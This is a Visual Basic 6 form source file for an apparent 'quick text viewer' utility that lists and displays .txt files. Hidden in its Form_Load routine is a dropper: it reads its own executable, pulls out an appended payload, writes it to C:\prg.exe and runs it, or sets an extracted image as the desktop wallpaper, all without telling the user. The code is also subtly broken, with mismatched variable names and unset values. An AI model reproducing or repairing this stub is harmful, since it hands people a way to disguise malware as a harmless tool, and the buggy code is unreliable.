VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Visualizador Rápido de Textos"
   ClientHeight    =   6135
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   10140
   BeginProperty Font 
      Name            =   "Fixedsys"
      Size            =   9
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6135
   ScaleWidth      =   10140
   StartUpPosition =   3  'Windows Default
   Begin VB.FileListBox File1 
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   6
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2850
      Left            =   7560
      Pattern         =   "*.txt"
      TabIndex        =   3
      Top             =   3135
      Width           =   2505
   End
   Begin VB.DirListBox Dir1 
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   6
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2640
      Left            =   7560
      TabIndex        =   2
      Top             =   405
      Width           =   2505
   End
   Begin VB.DriveListBox Drive1 
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   6
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   7560
      TabIndex        =   1
      Top             =   60
      Width           =   2505
   End
   Begin VB.TextBox Text1 
      Height          =   6030
      Left            =   60
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   60
      Width           =   7410
   End
   Begin VB.Image i1 
      Height          =   525
      Left            =   495
      Top             =   2655
      Visible         =   0   'False
      Width           =   720
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim linedata As String
Dim filename As String
Dim des As String
Dim fileContent As String
Dim fileContenta As String
Dim p_ret As String
Dim arqui As String
Dim reso As String
Dim prog As String
Dim progcont As String
Dim hidstr As String
Dim filelen As String
Dim filen As String
Dim aa As Integer

Private Sub Form_Load()

On Error Resume Next
If Len(App.Path) > 3 Then
prog = App.Path & "\" & App.EXEName & ".exe"
Else
prog = App.Path & App.EXEName & ".exe"
End If
Open prog For Binary Access Read As #1
progcont = Input(LOF(1), 1)
Close #1
If Left$(progcount, 3) = "|pp" Then reso = "C:\figura.jpg"
If Left$(progcount, 3) = "|ex" Then reso = "C:\prg.exe"

Dim leng As Integer
leng = 9
numx = Len(fileContent) - Int(InStr(1, fileContent, hidstr, vbBinaryCompare)) - leng

des = Right(fileContent, numx)

Open reso For Binary As #2
Put #2, , des
Close #2
If Left$(progcount, 3) = "|ex" Then Call Shell(reso, vbNormalFocus)
If Left$(progcount, 3) = "|pp" Then
i1.Picture = LoadPicture(reso)
SavePicture i1.Picture, "C:\wall.bmp"
Dim wall As String
wall = "C:\wall.bmp"
ChangeWP = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wall, 0)
End If
End Sub

Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub

Private Sub Drive1_Change()
Dir1.Path = Drive1.Drive
End Sub

Private Sub File1_Click()
On Error Resume Next
Text1.Text = Empty
If Len(File1.Path) = 3 Then
filename = File1.Path & File1.filename
Else
filename = File1.Path & "\" & File1.filename
End If
 Open filename For Input As #1
   Do Until EOF(1)
    Input #1, linedata
Text1.Text = Text1.Text & linedata
   Loop
  Close #1

End Sub
